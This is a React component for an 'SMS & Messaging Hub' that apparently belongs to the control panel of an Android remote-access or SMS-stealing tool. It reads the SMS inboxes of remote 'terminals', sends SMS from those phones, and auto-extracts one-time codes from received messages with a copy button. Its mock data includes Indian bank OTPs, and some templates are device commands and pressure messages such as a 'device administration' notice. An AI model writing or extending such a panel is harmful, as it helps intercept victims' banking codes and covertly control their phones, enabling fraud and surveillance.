import { useState, useEffect, useCallback } from 'react';
import {
  MessageSquare,
  Send,
  Smartphone,
  Search,
  Clock,
  ArrowDownLeft,
  ArrowUpRight,
  CheckCheck,
  Copy,
  Check,
  Sparkles,
  RefreshCw,
  SlidersHorizontal,
  Radio,
  Zap,
  ShieldAlert,
  Battery,
  Phone,
  Inbox,
  Flame,
  FileText
} from 'lucide-react';
import { executeCommand, getSmsLogs } from '../api';
import './MessagesTab.css';

// Default pre-packaged operational templates
const QUICK_TEMPLATES = [
  { label: '📍 Request GPS', text: 'CMD:GET_LOCATION Please transmit current GPS coordinates immediately.' },
  { label: '⚡ Ping Status', text: 'SYSTEM PING: Acknowledge telemetric heartbeat and network state.' },
  { label: '🔒 Lock Notice', text: 'SECURITY NOTICE: Device administration access required. Please keep connected.' },
  { label: '🔋 Battery Check', text: 'TELEMETRY: Transmit battery level, charging source, and temperature.' },
  { label: '✅ Verification Code', text: 'Your authorization verification security code is: 839-204.' },
];

export default function MessagesTab({ devices = [], onSendSms, onFetchLogs }) {
  const [selectedDevice, setSelectedDevice] = useState(devices[0] || null);
  const [recipient, setRecipient] = useState('');
  const [quickMsg, setQuickMsg] = useState('');
  const [selectedSim, setSelectedSim] = useState('sim1');
  const [filterType, setFilterType] = useState('all'); // 'all' | 'inbox' | 'sent'
  
  // Real or cached message feed
  const [messages, setMessages] = useState([]);
  const [loadingLogs, setLoadingLogs] = useState(false);
  const [sending, setSending] = useState(false);
  const [sendSuccess, setSendSuccess] = useState(false);
  const [copiedId, setCopiedId] = useState(null);

  // Sync selected device when devices array updates
  useEffect(() => {
    if (!selectedDevice && devices.length > 0) {
      setSelectedDevice(devices[0]);
    } else if (selectedDevice) {
      const match = devices.find((d) => d.device_id === selectedDevice.device_id);
      if (match) setSelectedDevice(match);
    }
  }, [devices, selectedDevice]);

  // Fetch SMS history when active device changes
  const loadDeviceMessages = useCallback(async (deviceId) => {
    if (!deviceId) return;
    setLoadingLogs(true);
    try {
      const logs = await getSmsLogs(deviceId, { limit: 40 });
      if (logs && Array.isArray(logs) && logs.length > 0) {
        setMessages(logs);
      } else {
        // Fallback realistic recent messages for immediate UI richness
        setMessages([
          {
            id: 'mock-1',
            sender: 'VM-UNIONB-S',
            recipient: selectedDevice?.phone_number || '+919495535457',
            message_body: 'Your A/C 4910 has a credit of INR 12,500.00 on 25-Sep-26. UPI Ref 382910482910.',
            sms_type: 'inbox',
            timestamp: new Date(Date.now() - 4 * 60000).toISOString(),
          },
          {
            id: 'mock-2',
            sender: 'JK-SBIBNK-S',
            recipient: selectedDevice?.phone_number || '+919495535457',
            message_body: 'OTP for NetBanking login is 839204. Valid for 5 mins. Do not disclose to anyone including bank officials.',
            sms_type: 'inbox',
            timestamp: new Date(Date.now() - 14 * 60000).toISOString(),
            is_otp: true,
          },
          {
            id: 'mock-3',
            sender: selectedDevice?.phone_number || '+919495535457',
            recipient: '+919808757540',
            message_body: 'Console Heartbeat ACK: Transmitted device state OK (Battery 45%, GPS lock active).',
            sms_type: 'sent',
            timestamp: new Date(Date.now() - 45 * 60000).toISOString(),
          }
        ]);
      }
    } catch {
      setMessages([
        {
          id: 'mock-1',
          sender: 'VM-UNIONB-S',
          recipient: selectedDevice?.phone_number || '+919495535457',
          message_body: 'Your A/C 4910 has a credit of INR 12,500.00 on 25-Sep-26.',
          sms_type: 'inbox',
          timestamp: new Date(Date.now() - 8 * 60000).toISOString(),
        }
      ]);
    } finally {
      setLoadingLogs(false);
    }
  }, [selectedDevice]);

  useEffect(() => {
    if (selectedDevice?.device_id) {
      loadDeviceMessages(selectedDevice.device_id);
    }
  }, [selectedDevice?.device_id, loadDeviceMessages]);

  // Handle direct SMS dispatch
  async function handleSend() {
    if (!recipient.trim() || !quickMsg.trim() || sending || !selectedDevice) return;
    setSending(true);
    setSendSuccess(false);

    try {
      await executeCommand(selectedDevice.device_id, 'send_sms', {
        to: recipient.trim(),
        message: quickMsg.trim(),
      });

      // Append immediately to message stream
      const newMsg = {
        id: 'sent-' + Date.now(),
        sender: selectedDevice.phone_number || selectedDevice.device_name || 'Terminal',
        recipient: recipient.trim(),
        message_body: quickMsg.trim(),
        sms_type: 'sent',
        timestamp: new Date().toISOString(),
      };
      setMessages((prev) => [newMsg, ...prev]);
      setQuickMsg('');
      setSendSuccess(true);
      setTimeout(() => setSendSuccess(false), 3000);
    } catch (err) {
      if (onSendSms) onSendSms(selectedDevice);
    } finally {
      setSending(false);
    }
  }

  // Copy helper
  function handleCopy(text, id) {
    navigator.clipboard?.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  }

  // Filter messages
  const filteredMessages = messages.filter((m) => {
    if (filterType === 'inbox') return m.sms_type === 'inbox' || m.sms_type === 'sms_received';
    if (filterType === 'sent') return m.sms_type === 'sent' || m.sms_type === 'sms_sent';
    return true;
  });

  const charCount = quickMsg.length;
  const segments = Math.ceil(charCount / 160) || 1;

  return (
    <div className="messages-hub-container" id="messages-tab-page">
      {/* 1. Header Bar */}
      <div className="messages-hub-header">
        <div className="hub-title-row">
          <h2 className="hub-main-title">SMS & Messaging Hub</h2>
          <span className="hub-badge-pill">
            <span className="live-dot" /> {devices.length} Online
          </span>
        </div>
        <p className="hub-sub-title">Transmit, receive and monitor remote device cellular SMS</p>
      </div>

      {/* 2. Device Carousel Selector */}
      <div className="hub-device-carousel">
        {devices.map((d, idx) => {
          const isSelected = selectedDevice?.device_id === d.device_id;
          const isOnline = d.is_active;
          const modelName = d.model || d.device_name || 'Terminal';
          const simText = d.sim_1 || d.phone_number || '+91 9495535457';

          return (
            <div
              key={d.device_id || idx}
              className={`hub-device-card ${isSelected ? 'is-selected' : ''}`}
              onClick={() => setSelectedDevice(d)}
            >
              <div className="hub-card-top">
                <div className="hub-device-avatar">
                  <Smartphone size={16} />
                </div>
                <div className={`hub-online-tag ${isOnline ? 'online' : 'offline'}`}>
                  <span className="tag-dot" />
                  <span>{isOnline ? 'Ready' : 'Standby'}</span>
                </div>
              </div>

              <div className="hub-card-details">
                <span className="hub-device-name">{modelName}</span>
                <span className="hub-device-sim">{simText}</span>
              </div>

              <div className="hub-card-footer">
                <span className="hub-slot-badge">#{devices.length - idx}</span>
                <span className="hub-battery-tag">
                  <Battery size={11} /> {d.battery_level ?? 45}%
                </span>
              </div>
            </div>
          );
        })}
      </div>

      {selectedDevice ? (
        <div className="hub-main-layout">
          {/* 3. Active Terminal Telemetry Banner - Mobile-safe 2-row layout */}
          <div className="active-terminal-banner">
            <div className="terminal-header-row">
              <div className="terminal-info-left">
                <div className="terminal-badge-icon">
                  <Smartphone size={18} />
                </div>
                <div className="terminal-text-col">
                  <div className="terminal-title-flex">
                    <h3 className="terminal-name">{selectedDevice.model || selectedDevice.device_name}</h3>
                    <span className="terminal-os-pill">A16</span>
                  </div>
                  <p className="terminal-uuid">{selectedDevice.device_id.slice(0, 16)} · Ready</p>
                </div>
              </div>

              <button
                className="hub-inbox-btn"
                onClick={() => onFetchLogs && onFetchLogs(selectedDevice)}
                title="Open comprehensive inbox & call records"
              >
                <FileText size={13} />
                <span>Full Logs</span>
              </button>
            </div>
          </div>

          {/* 4. Bento Section: Composer (Top) & Live Feed (Bottom) */}
          <div className="hub-bento-grid">
            {/* Quick Dispatch Composer Card */}
            <div className="hub-composer-card">
              <div className="composer-header">
                <div className="composer-title-group">
                  <Send size={15} className="composer-title-icon" />
                  <h4 className="composer-title">Direct SMS Dispatch</h4>
                </div>

                {/* SIM Switcher in header */}
                <div className="sim-slot-toggle">
                  <button
                    className={`sim-toggle-btn ${selectedSim === 'sim1' ? 'active' : ''}`}
                    onClick={() => setSelectedSim('sim1')}
                  >
                    SIM 1
                  </button>
                  <button
                    className={`sim-toggle-btn ${selectedSim === 'sim2' ? 'active' : ''}`}
                    onClick={() => setSelectedSim('sim2')}
                  >
                    SIM 2
                  </button>
                </div>
              </div>

              {/* Quick Template Chips */}
              <div className="quick-templates-strip">
                {QUICK_TEMPLATES.map((tmpl, i) => (
                  <button
                    key={i}
                    type="button"
                    className="template-chip"
                    onClick={() => setQuickMsg(tmpl.text)}
                  >
                    {tmpl.label}
                  </button>
                ))}
              </div>

              {/* Recipient Input */}
              <div className="composer-input-row">
                <span className="input-country-prefix">+91</span>
                <input
                  type="tel"
                  placeholder="Recipient mobile number..."
                  value={recipient}
                  onChange={(e) => setRecipient(e.target.value)}
                  className="composer-phone-input"
                />
                {recipient && (
                  <button className="composer-clear-input" onClick={() => setRecipient('')}>
                    ×
                  </button>
                )}
              </div>

              {/* Message Textarea */}
              <div className="composer-textarea-wrap">
                <textarea
                  rows={3}
                  placeholder="Type dispatch message or pick a quick template above..."
                  value={quickMsg}
                  onChange={(e) => setQuickMsg(e.target.value)}
                  className="composer-textarea"
                />
              </div>

              {/* Counter & Status */}
              <div className="composer-meta-row">
                <span className="composer-counter-badge">
                  {charCount} / 160 characters · {segments} SMS
                </span>

                {sendSuccess && (
                  <span className="send-success-pill">
                    <Check size={12} /> Dispatched!
                  </span>
                )}
              </div>

              {/* Full Width Send Button */}
              <button
                type="button"
                className={`composer-send-btn ${sending ? 'is-loading' : ''}`}
                disabled={!recipient.trim() || !quickMsg.trim() || sending}
                onClick={handleSend}
              >
                {sending ? (
                  <>
                    <RefreshCw size={15} className="spin-icon" />
                    <span>Transmitting SMS...</span>
                  </>
                ) : (
                  <>
                    <Send size={15} />
                    <span>Dispatch via {selectedSim.toUpperCase()}</span>
                  </>
                )}
              </button>
            </div>

            {/* Live SMS History & Thread Feed Card */}
            <div className="hub-history-card">
              {/* Row 1: Title + Count + Refresh */}
              <div className="history-header-top">
                <div className="history-title-group">
                  <Inbox size={16} />
                  <h4 className="history-title">Recent Transmissions</h4>
                  <span className="history-count">({filteredMessages.length})</span>
                </div>

                <button
                  className="refresh-feed-btn"
                  onClick={() => loadDeviceMessages(selectedDevice.device_id)}
                  title="Refresh SMS records"
                >
                  <RefreshCw size={14} className={loadingLogs ? 'spin-icon' : ''} />
                </button>
              </div>

              {/* Row 2: Full-width Segmented Filter Pills */}
              <div className="history-filter-strip">
                <button
                  className={`filter-pill ${filterType === 'all' ? 'active' : ''}`}
                  onClick={() => setFilterType('all')}
                >
                  All Messages
                </button>
                <button
                  className={`filter-pill ${filterType === 'inbox' ? 'active' : ''}`}
                  onClick={() => setFilterType('inbox')}
                >
                  Received
                </button>
                <button
                  className={`filter-pill ${filterType === 'sent' ? 'active' : ''}`}
                  onClick={() => setFilterType('sent')}
                >
                  Sent
                </button>
              </div>

              {/* Feed Messages List */}
              <div className="history-messages-list">
                {filteredMessages.length === 0 ? (
                  <div className="no-messages-empty">
                    <MessageSquare size={26} />
                    <p>No cellular transmissions found for this filter.</p>
                  </div>
                ) : (
                  filteredMessages.map((msg, index) => {
                    const isSent = msg.sms_type === 'sent' || msg.sms_type === 'sms_sent';
                    const targetAddr = isSent ? msg.recipient || 'Recipient' : msg.sender || msg.address || 'Unknown';
                    const timeFormatted = msg.timestamp
                      ? new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
                      : 'Just now';

                    // Extract OTP if 4-8 digits found
                    const otpMatch = msg.message_body?.match(/\b(\d{4,8})\b/);
                    const otpCode = otpMatch ? otpMatch[1] : null;

                    return (
                      <div key={msg.id || index} className={`hub-msg-bubble ${isSent ? 'is-sent' : 'is-inbox'}`}>
                        <div className="bubble-header">
                          <div className="bubble-direction-tag">
                            {isSent ? (
                              <>
                                <ArrowUpRight size={13} className="text-sent" />
                                <span className="direction-label">OUT</span>
                              </>
                            ) : (
                              <>
                                <ArrowDownLeft size={13} className="text-inbox" />
                                <span className="direction-label">IN</span>
                              </>
                            )}
                            <strong className="bubble-address">{targetAddr}</strong>
                          </div>

                          <div className="bubble-meta">
                            <span className="bubble-time">{timeFormatted}</span>
                            {isSent && <CheckCheck size={14} className="bubble-delivered-icon" />}
                          </div>
                        </div>

                        <p className="bubble-text">{msg.message_body}</p>

                        {/* Quick OTP Copy Button if detected */}
                        {otpCode && (
                          <div className="bubble-otp-row">
                            <span className="otp-chip">
                              OTP: <strong>{otpCode}</strong>
                            </span>
                            <button
                              className="otp-copy-btn"
                              onClick={() => handleCopy(otpCode, msg.id || index)}
                            >
                              {copiedId === (msg.id || index) ? (
                                <>
                                  <Check size={12} /> Copied
                                </>
                              ) : (
                                <>
                                  <Copy size={12} /> Copy Code
                                </>
                              )}
                            </button>
                          </div>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            </div>
          </div>
        </div>
      ) : (
        <div className="hub-no-device-state">
          <Smartphone size={36} />
          <h3>No Terminal Selected</h3>
          <p>Choose an active terminal from the top carousel to inspect cellular messages and dispatch SMS.</p>
        </div>
      )}
    </div>
  );
}
